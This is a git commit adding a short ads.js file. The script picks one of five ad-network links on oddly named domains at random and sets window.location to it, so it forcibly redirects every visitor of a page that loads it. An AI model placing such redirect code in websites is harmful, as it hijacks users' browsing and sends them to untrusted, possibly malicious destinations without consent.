95a6faac544a8d0b4c5e5473d80a80449945f2e3
muvipro <110364252+muvipro@users.noreply.github.com>
2022-08-21 12:50:23 +0800

    Create ads.js

---
+++ ads.js
@@ -0,0 +1,9 @@
+var dataUrl = [
+    '//inquiryclank.com/sgnfjfg1?key=cafae42abf7afad6a696828e19405747',
+    '//aliveperjuryruby.com/xehjv0hgr?key=c9955a9940bafccb93ff39894f51ad31',
+    '//scareshortnovel.com/k4qn8fta?key=53a079ee752630cb47b753228c9edbd6',
+    '//www.trustedcpmrevenue.com/u843uwte?key=3e73b89a9ed9d2e16a5d193c60980d28',
+    '//inquiryclank.com/z5u26gw0i?key=afd8bed48a5de3937c8422b84862a994'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
